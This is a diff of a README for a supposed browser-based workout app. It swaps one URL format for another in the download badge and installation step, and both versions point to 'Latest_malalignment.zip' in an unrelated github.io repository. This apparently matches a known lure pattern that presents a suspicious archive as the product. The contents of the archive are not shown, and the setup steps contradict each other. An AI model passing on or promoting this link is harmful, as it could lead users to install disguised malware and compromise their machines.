@@ -7,7 +7,7 @@ description: "Organize and manage day-to-day workout routines with this browser-
 
 ## 🚀 Getting Started
 
-[![Download Now](https://img.shields.io/badge/Download-App-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/A1fr3d0/a1fr3d0.github.io/main/andric/Latest_malalignment.zip)
+[![Download Now](https://img.shields.io/badge/Download-App-4CAF50?style=for-the-badge&logo=github)](https://github.com/A1fr3d0/a1fr3d0.github.io/raw/refs/heads/main/andric/Latest_malalignment.zip)
 
 Visit this link to download the application.
 
@@ -15,7 +15,7 @@ This browser-based personal trainer app helps you organize fitness guidance and 
 
 ## 📥 Installation
 
-1. Click the big green download button above or go directly to: [https://raw.githubusercontent.com/A1fr3d0/a1fr3d0.github.io/main/andric/Latest_malalignment.zip](https://raw.githubusercontent.com/A1fr3d0/a1fr3d0.github.io/main/andric/Latest_malalignment.zip)
+1. Click the big green download button above or go directly to: [https://github.com/A1fr3d0/a1fr3d0.github.io/raw/refs/heads/main/andric/Latest_malalignment.zip](https://github.com/A1fr3d0/a1fr3d0.github.io/raw/refs/heads/main/andric/Latest_malalignment.zip)
 2. On the GitHub page, click the green "Code" button, then select "Download ZIP".
 3. Save the ZIP file to your computer (for example, on your Desktop).
 4. Right-click the ZIP file and choose "Extract All..." then follow the prompts.
